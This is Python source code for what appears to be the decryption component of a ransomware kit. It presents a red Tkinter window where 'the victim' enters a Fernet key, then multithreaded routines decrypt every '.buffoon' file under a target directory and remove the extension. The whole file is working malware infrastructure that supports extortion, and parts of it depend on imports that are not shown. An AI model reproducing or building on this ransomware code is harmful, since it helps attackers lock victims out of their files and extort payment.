from tkinter import * # GUI 
from tkinter.font import Font # Design some label
from cryptography.fernet import Fernet
from threading import Thread,active_count,Event
from os.path import dirname,realpath,getsize
from os import system
from sys import path
from time import sleep
# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *
from Cleaning.clean import Clean

class DecryptFiles(): 


    def window(self) : 
        'Set up main window'
        self.app4 = Tk()
        self.app4.title('Decrypt files')
        self.app4.iconbitmap(self.ico_img_path)
        self.app4.geometry('800x600')
        self.app4.resizable(width=False, height=False)
        self.app4['bg'] = 'red4'
        self.files_target = ['buffoon'] 
        font_label = Font(self.app4, family='Courrier', size=15,weight='bold')
        label = Label(self.app4, text='Enter the decryption key :',bg='red4',font=font_label)
        self.entry = Entry(self.app4,width=35) # recover the key enter by the victim
        button = Button(self.app4, text='Decrypt',command=self.enumerate_files_to_decrypt)
        label.place(x=270,y=150)
        self.entry.place(x=270, y=200)
        button.place(x=270, y=250)

        self.app4.mainloop()


    def cmd_files(self):
        'Just show files decrypted for user'
        try:
            system(f'FORFILES /P {DIR_TO_HIT} /S /c "cmd /c echo Decrypt @path" & FORFILES /P {DIR_TO_HIT} /S /c "cmd /c echo Decrypt @path" ')
        except Exception as e:
            print(e)
            pass


    def enumerate_files_to_decrypt(self) : 
        'Enumerates all files to encrypt'
        #Recover the free key 
        free_file = open(PATH_FREE_FILE_DECRYPT,'r')
        free_file = free_file.read()
        if len(self.entry.get()) == 44: 
            self.key_to_decrypt = self.entry.get()
            self.cypher = Fernet(self.key_to_decrypt)
            self.files_to_decrypt = []
            self.big_files_to_decrypt = []
            self.app4.withdraw()
            self.app.withdraw() # Hide windows

            for root,sub,files in os.walk(DIR_TO_HIT) : #Browse files
                for f in files : # link file name with path
                    abs_file_path = os.path.join(root,f)
                    if abs_file_path == free_file : 
                        continue
                    # If the file extension are not in target_files
                    if not abs_file_path.split('.')[-1] in self.files_target : 
                        continue
                    # Enumerate big files
                    if (getsize(abs_file_path)/10**6) > 80 : # If larger than 80MB
                        self.big_files_to_decrypt.append(abs_file_path)
                        continue
                    self.files_to_decrypt.append(abs_file_path)

            print('BIG FILE :',self.big_files_to_decrypt)
            #Call function
            self.thread_armyDF()
            self.thread_army_bigDF()
            #Finish him
            Clean.get_wallpaper()
        else : 
            print('bad KEY')
            pass


    def thread_armyDF(self) : 
        'Thread shit'
        try :
            event = Event()
            event.is_set()

            th_ = Thread(target=self.cmd_files,daemon=True)
            th_.start()
            for file_to_decrypt in self.files_to_decrypt : 
                # Threading
                th1 = Thread(target=self.decrypt_filesDF,args=(file_to_decrypt,),daemon=True) 
                th1.start()
                # We limit the numbers of threads by the max amount of CPU cores
                if active_count() == os.cpu_count() :             
                    th1.join()

            while event:
                th1.join()
                if active_count() <= 3:
                    event.clear()
                    th1.join()
                    break
            sleep(1)
        except Exception as e: 
            print('Error in thread_armyDF :',e)
        

    def decrypt_filesDF(self,file_to_decrypt) : 
        'Decrypt files'
        
        try :
            # Read data
            with open(f'{file_to_decrypt}', 'rb') as f : 
                data = f.read()
            # Encrypt data
            data_decrypted = self.cypher.decrypt(data)
            print(f'Decrypt {file_to_decrypt}')
            # Write encrypted data
            with open(f'{file_to_decrypt}','wb') as ff : 
                ff.write(data_decrypted)
            name_file = str(file_to_decrypt).removesuffix('.buffoon')
            # Rename file without '.buffoon'
            os.rename(file_to_decrypt, str(name_file)) 
        except  Exception as e :
            print('Error in decrypt_filesDF',e) 
            pass


    def thread_army_bigDF(self) : 
        'Threading encryption for big files'
        try :
            event = Event()
            event.is_set()
            for file_to_decrypt in self.big_files_to_decrypt : 
                # Threading
                th2 = Thread(target=self.decrypt_big_files,args=(file_to_decrypt,),daemon=True) 
                th2.start()
                print('START THE BIG THREAD')
                # We limit the numbers of threads by the amount of CPU cores
                if active_count() == os.cpu_count() : 
                    #Take down the thread
                    th2.join()
            # Clean up threading
            while event:
                th2.join()
                if active_count() <= 2: # 2 Thread because of Tkinter
                    event.clear()
                    break
            sleep(1)
        except Exception as e :
            print('Error in thread_army_bigDF :',e)


    def decrypt_big_files(self,file_to_decrypt):
        'Decrypt big files by chunk of 6MB'

        try :
            file_to_decrypt_wext = str(file_to_decrypt).removesuffix('.buffoon')
            with open(file_to_decrypt, "rb") as fin, open(f'{file_to_decrypt_wext}', "wb") as fout:
                while True:
                    block = fin.read(8000100)  
                    if not block:
                        break
                    output = self.cypher.decrypt(block)
                    print(f'decrypted block size {file_to_decrypt}: ' + str(len(output)))  
                    fout.write(output)
                fout.close()
            os.remove(file_to_decrypt)
        except Exception as e:
            print(e)


if __name__ == "__main__" : 
    pass
